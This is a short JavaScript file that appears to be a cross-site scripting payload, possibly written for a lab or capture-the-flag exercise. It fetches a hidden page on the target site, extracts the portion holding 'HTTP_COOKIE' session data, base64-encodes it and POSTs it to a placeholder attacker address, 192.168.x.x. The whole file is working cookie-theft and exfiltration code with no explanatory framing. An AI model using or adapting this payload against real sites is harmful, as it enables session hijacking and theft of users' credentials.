console.log('Script is running');

//
// Function to make an XMLHttpRequest
function makeRequest(method, url, callback) {
    var req = new XMLHttpRequest();
    req.onload = function () {
        if (this.status === 200) {
            console.log('Request success for', url);
            callback(this.responseText);
        } else {
            console.error('Failed to get data from the request. Status:', this.status);
        }
    };
    req.open(method, url, true);
    req.send();
}

// Function to handle the second request
function handleSecondRequest(response) {
    console.log('First request response:', response);

    var req2 = new XMLHttpRequest();
    var newUrl = 'http://192.168.x.x/';

    req2.onload = function () {
        console.log('Second request success');
        console.log('Response from second request:', req2.responseText);
    };

    req2.open('POST', newUrl, true);
    req2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');

    // Encode and send the session data in the request body
    const sess = encodeURIComponent(response.substring(response.indexOf('HTTP_COOKIE') + 1));
    var postData = 'data=' + btoa(sess);
    req2.send(postData);
}

// URLs for requests
var firstUrl = 'https://things.edu/secrets/no-one-can-see-me';

// Make the first request
makeRequest('GET', firstUrl, handleSecondRequest);

//
//
